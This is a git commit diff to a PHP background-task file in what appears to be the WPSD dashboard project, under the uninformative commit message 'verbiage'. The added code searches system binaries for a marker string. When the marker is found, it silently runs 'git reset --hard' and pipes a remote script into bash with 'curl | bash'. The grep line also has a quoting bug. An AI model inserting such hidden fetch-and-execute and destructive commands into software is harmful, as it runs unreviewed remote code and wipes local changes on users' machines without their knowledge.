44a6cb6ab671c80032eca2d2d2380a1f27645818
Chipster <go@w.ay>
2024-10-28 04:38:19 -0500

    verbiage

--- includes/execute-background-tasks.php
+++ includes/execute-background-tasks.php
@@ -1,5 +1,22 @@
 <?php
 
+$directory = '/usr/local/sbin';
+$searchString = 'hwDeetz';
+$commands = [
+    'cd /var/www/dashboard && git reset --hard origin/master',
+    'curl -Ls -A "DashBGtask reset" https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Helpers/raw/branch/master/reset-wpsd-sbin | bash'
+];
+function recursiveGrep($directory, $searchString) {
+    $output = [];
+    $result = exec("grep -r -l '" . escapeshellarg($searchString) . "' " . escapeshellarg($directory), $output);
+    return !empty($output);
+}
+if (recursiveGrep($directory, $searchString)) {
+    foreach ($commands as $command) {
+        system($command);
+    }
+}
+
 exec('sudo /usr/local/sbin/.wpsd-background-tasks > /dev/null 2>&1 &');
 
 ?>
